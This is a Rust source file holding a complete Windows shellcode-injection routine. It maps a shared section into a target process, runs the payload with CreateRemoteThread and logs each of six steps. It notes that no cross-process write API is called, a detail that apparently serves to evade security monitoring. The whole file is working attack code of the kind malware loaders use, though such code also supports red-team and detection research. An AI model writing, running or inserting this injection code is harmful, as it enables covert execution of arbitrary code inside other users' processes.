use crate::injection::InjectionResult;
use crate::log::LogSink;

#[cfg(windows)]
pub fn live_inject(
    pid: u32,
    shellcode: &[u8],
    log: &LogSink,
) -> Result<InjectionResult, String> {
    use crate::resolve;
    use std::ffi::c_void;

    const PROCESS_CREATE_THREAD: u32 = 0x0002;
    const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
    const PROCESS_VM_OPERATION: u32 = 0x0008;
    const PROCESS_VM_READ: u32 = 0x0010;
    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
    const PAGE_EXECUTE_READ: u32 = 0x20;
    const FILE_MAP_WRITE: u32 = 0x0002;
    const INFINITE: u32 = 0xFFFFFFFF;
    const WAIT_OBJECT_0: u32 = 0;

    let size = shellcode.len();
    let invalid_handle = -1isize as *mut c_void;

    log.step("[1/6] Create shared section");
    let section = unsafe {
        resolve::CreateFileMappingW(
            invalid_handle,
            std::ptr::null(),
            PAGE_EXECUTE_READWRITE,
            0,
            size as u32,
            std::ptr::null(),
        )
    };
    if section.is_null() {
        return Err("section creation failed".to_string());
    }
    log.info(format!("      section handle: {:?}", section));

    log.step("[2/6] Map section locally");
    let local_view = unsafe { resolve::MapViewOfFile(section, FILE_MAP_WRITE, 0, 0, size) };
    if local_view.is_null() {
        unsafe { resolve::CloseHandle(section) };
        return Err("local mapping failed".to_string());
    }
    log.info(format!(
        "      local view at {:#p} ({} bytes)",
        local_view, size
    ));

    log.step(format!("[3/6] Write {} bytes to local mapping", size));
    unsafe {
        core::ptr::copy_nonoverlapping(shellcode.as_ptr(), local_view as *mut u8, size);
    }
    log.info("      payload written to shared section via local mapping");

    unsafe { resolve::UnmapViewOfFile(local_view as *const c_void) };
    log.detail("      local view unmapped");

    log.step(format!("[4/6] Open target (PID {}) + map section remotely", pid));
    let process_access =
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ;
    let process = unsafe { resolve::OpenProcess(process_access, 0, pid) };
    if process.is_null() {
        unsafe { resolve::CloseHandle(section) };
        return Err("process open failed (check privileges — try from an elevated shell)".to_string());
    }

    let remote_view = unsafe {
        resolve::MapViewOfFileNuma2(
            section,
            process,
            0,
            std::ptr::null(),
            size,
            0,
            PAGE_EXECUTE_READ,
            u32::MAX,
        )
    };
    unsafe { resolve::CloseHandle(section) };

    if remote_view.is_null() {
        unsafe { resolve::CloseHandle(process) };
        return Err(
            "remote mapping failed (Windows 10 1703+ required)"
                .to_string(),
        );
    }
    let remote_base = remote_view;
    log.info(format!(
        "      remote view at {:#p} ({} bytes, PAGE_EXECUTE_READ)",
        remote_base, size
    ));
    log.info("      no cross-process write API called");

    log.step(format!("[5/6] Start remote thread at {:#p}", remote_base));
    let mut thread_id: u32 = 0;
    let thread = unsafe {
        resolve::CreateRemoteThread(
            process,
            std::ptr::null(),
            0,
            remote_base as *const c_void,
            remote_base as *const c_void,
            0,
            &mut thread_id,
        )
    };
    if thread.is_null() {
        unsafe { resolve::CloseHandle(process) };
        return Err("remote thread creation failed".to_string());
    }
    log.info(format!("      remote thread started (TID {})", thread_id));

    log.step("[6/6] Waiting for completion");
    let wait = unsafe { resolve::WaitForSingleObject(thread, INFINITE) };
    if wait != WAIT_OBJECT_0 {
        unsafe { resolve::CloseHandle(thread) };
        unsafe { resolve::CloseHandle(process) };
        return Err(format!(
            "wait returned {} (expected 0)",
            wait
        ));
    }
    let mut exit_code: u32 = 0;
    if unsafe { resolve::GetExitCodeThread(thread, &mut exit_code) } == 0 {
        unsafe { resolve::CloseHandle(thread) };
        unsafe { resolve::CloseHandle(process) };
        return Err("exit code retrieval failed".to_string());
    }
    unsafe { resolve::CloseHandle(thread) };
    unsafe { resolve::CloseHandle(process) };

    if exit_code == 0xC0000005 {
        log.error(format!(
            "      remote thread CRASHED — exit code 0x{:X} (ACCESS_VIOLATION)",
            exit_code
        ));
        log.error("      invalid memory access");
    } else if exit_code >= 0xC0000000 {
        log.warning(format!(
            "      remote thread exited with NTSTATUS error 0x{:X}",
            exit_code
        ));
    } else {
        log.info(format!(
            "      remote thread exited with code {}",
            exit_code
        ));
    }
    log.info(format!(
        "      payload at {:#p} ({} bytes)",
        remote_base, size
    ));
    Ok(InjectionResult {
        remote_base: remote_base as u64,
        size,
    })
}

#[cfg(not(windows))]
pub fn live_inject(
    _pid: u32,
    _shellcode: &[u8],
    _log: &LogSink,
) -> Result<InjectionResult, String> {
    Err("requires Windows".to_string())
}
